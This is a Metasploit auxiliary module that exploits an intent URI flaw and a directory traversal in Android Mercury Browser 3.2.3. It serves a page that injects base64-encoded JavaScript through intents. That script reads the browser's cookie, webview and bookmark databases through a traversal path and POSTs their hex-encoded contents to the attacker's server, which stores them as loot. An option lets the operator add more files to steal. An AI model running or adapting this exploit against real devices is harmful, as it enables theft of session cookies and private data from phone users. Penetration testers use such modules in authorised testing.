##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Android Mercury Browser Intent URI Scheme and Directory Traversal Vulnerability',
      'Description'    => %q{
        This module exploits an unsafe intent URI scheme and directory traversal found in
        Android Mercury Browser version 3.2.3. The intent allows the attacker to invoke a
        private wifi manager activity, which starts a web server for Mercury on port 8888.
        The webserver also suffers a directory traversal that allows remote access to
        sensitive files.

        By default, this module will go after webviewCookiesChromium.db, webviewCookiesChromiumPrivate.db,
        webview.db, and bookmarks.db. But if this isn't enough, you can also specify the
        ADDITIONAL_FILES datastore option to collect more files.
      },
      'Author'         =>
        [
          'rotlogix', # Vuln discovery, PoC, etc
          'sinn3r',
          'joev'
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://rotlogix.com/2015/08/23/exploiting-the-mercury-browser-for-android/' ],
          [ 'URL', 'http://versprite.com/og/multiple-vulnerabilities-in-mercury-browser-for-android-version-3-0-0/' ]
        ]
    ))

    register_options(
      [
        OptString.new('ADDITIONAL_FILES', [false, 'Additional files to steal from the device'])
      ])
  end

  def is_android?(user_agent)
    user_agent.include?('Android')
  end

  def get_html
    %Q|
    <html>
    <head>
    <meta charset="utf-8" />
    </head>
    <body>
    <script>
    location.href="intent:#Intent;SEL;component=com.ilegendsoft.mercury/.external.wfm.ui.WFMActivity2;action=android.intent.action.VIEW;end";
    setTimeout(function() {
      location.href="intent:#Intent;S.load=javascript:eval(atob('#{Rex::Text.encode_base64(uxss)}'));SEL;component=com.ilegendsoft.mercury/com.ilegendsoft.social.common.SimpleWebViewActivity;end";
    }, 500);
    </script>
    </body>
    </html>
    |
  end

  def backend_url
    proto = (datastore['SSL'] ? 'https' : 'http')
    my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']
    port_str = (datastore['SRVPORT'].to_i == 80) ? '' : ":#{datastore['SRVPORT']}"
    resource = ('/' == get_resource[-1,1]) ? get_resource[0, get_resource.length-1] : get_resource

    "#{proto}://#{my_host}#{port_str}#{resource}/catch"
  end

  def uxss
    %Q|
      function exploit() {
        history.replaceState({},{},'/storage/emulated/0/Download/');
        var urls = #{JSON.generate(file_urls)};
        urls.forEach(function(url) {
          var x = new XMLHttpRequest();
          x.open('GET', '/dodownload?fname=../../../..'+url);
          x.responseType = 'arraybuffer';
          x.send();
          x.onload = function(){
            var buff = new Uint8Array(x.response);
            var hex = Array.prototype.map.call(buff, function(d) {
              var c = d.toString(16);
              return (c.length < 2) ? 0+c : c;
            }).join('');
            var send = new XMLHttpRequest();
            send.open('POST', '#{backend_url}/'+encodeURIComponent(url.replace(/.*\\//,'')));
            send.setRequestHeader('Content-type', 'text/plain');
            send.send(hex);
          };
        });
      }

      var q = window.open('http://localhost:8888/','x');
      q.onload = function(){ q.eval('('+exploit.toString()+')()'); };
    |
  end

  def file_urls
    files = [
      '/data/data/com.ilegendsoft.mercury/databases/webviewCookiesChromium.db',
      '/data/data/com.ilegendsoft.mercury/databases/webviewCookiesChromiumPrivate.db',
      '/data/data/com.ilegendsoft.mercury/databases/webview.db',
      '/data/data/com.ilegendsoft.mercury/databases/bookmarks.db'
    ]

    if datastore['ADDITIONAL_FILES']
      files.concat(datastore['ADDITIONAL_FILES'].split)
    end

    files
  end

  def on_request_uri(cli, req)
    print_status("Requesting: #{req.uri}")

    unless is_android?(req.headers['User-Agent'])
      print_error('Target is not Android')
      send_not_found(cli)
      return
    end

    if req.method =~ /post/i
      if req.body
        filename = File.basename(req.uri) || 'file'
        output = store_loot(
          filename, 'text/plain', cli.peerhost, hex2bin(req.body), filename, 'Android mercury browser file'
        )
        print_good("Stored #{req.body.bytes.length} bytes to #{output}")
      end

      return
    end

    print_status('Sending HTML...')
    html = get_html
    send_response_html(cli, html)
  end

  def hex2bin(hex)
    hex.chars.each_slice(2).map(&:join).map { |c| c.to_i(16) }.map(&:chr).join
  end


  def run
    exploit
  end
end
